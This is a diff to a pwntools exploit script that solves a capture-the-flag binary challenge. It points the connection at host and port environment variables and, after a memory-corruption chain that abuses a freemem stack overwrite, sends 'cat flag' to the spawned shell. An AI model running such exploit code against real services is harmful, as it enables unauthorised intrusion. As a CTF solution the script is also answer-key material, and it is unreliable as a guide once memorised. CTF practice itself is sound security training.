@@ -1,10 +1,12 @@
+import os
+
 from pwn import *
 
 #context.log_level = 'debug'
 context.terminal = ['tmux', 'new-window']
 
 binary = './solution/chall/app'
-nc = 'nc 10.20.10.10 9205'
+nc = 'nc ' + os.environ['SERVICE_APP_MAIN_HOST'] + ' ' + os.environ['SERVICE_APP_MAIN_PORT']
 elf = context.binary = ELF(binary)
 libc = elf.libc
 gdbscript = """
@@ -115,7 +117,8 @@ p.sendline(b'11912') # d8 gadget
 p.recvuntil(b'length: ')
 p.sendline(b'a') # fail iocheck, calls freemem at some point
 
-p.interactive()
+p.sendline(b"cat flag")
+print(p.recvall(timeout=10).decode(errors="replace"))
 
 '''
 freemem overwrite stack when entered gadget
